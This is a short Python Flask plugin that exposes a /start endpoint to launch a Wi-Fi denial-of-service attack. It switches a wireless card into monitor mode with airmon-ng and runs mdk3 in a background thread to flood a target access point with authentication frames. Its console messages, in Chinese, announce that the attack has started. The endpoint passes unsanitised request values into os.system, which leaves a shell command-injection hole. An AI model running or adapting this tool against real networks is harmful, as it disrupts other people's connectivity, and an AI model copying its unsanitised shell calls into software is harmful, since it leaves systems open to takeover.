import re,os,sys,time,signal,subprocess,json,random,string,argparse
from flask import Flask,request
import requests
import threading
from scapy.all import *

################ Flask launch #########################

PLATFORM_URL = "https://127.0.0.1:7000/api/service/result"
WEB_SERVER = "127.0.0.1"
PORT = 10004
app = Flask(__name__)

#######################################################
def ddos_start(ssid,device):

    if "mon" in device:
        pass
    else:
        os.system("airmon-ng start "+device)
        device = device+"mon"
        
    if ssid == "0":
        print("ssid error")
        sys.exit()
    else:
        os.system("mdk3 "+ device+" a -a "+ssid)
        print("攻击开始,请观察设备信息")

#######################################################

@app.route('/start', methods=['POST'])
def run_threading_check():
    result = {}
    params = request.json
    if params != None:
        ssid = params.get("ssid")
        device = params.get("device")
        t = threading.Thread(target=ddos_start, args=(ssid, device,))
        t.start()
        result["message"] = "攻击开始,请观察设备信息"
    else:
        result["status"] = "error"
        result["message"] = "Invalid parameters"
    return result
    
#######################################################

def WIFISecurity():
    #data = request.get_data()
    #jsdata = json.loads(data)
    jsdata = request.get_json()
    print('-------------------------',jsdata)
    if jsdata != None:
        #r = run_threading_check(jsdata)
        r = run_threading_check()
        response = app.response_class(
           response=json.dumps(r),
           mimetype='application/json'
        )
        return "Plugin Start Execution"
    else:
        return 'No parameters'
        
app.run(host=WEB_SERVER, port=PORT)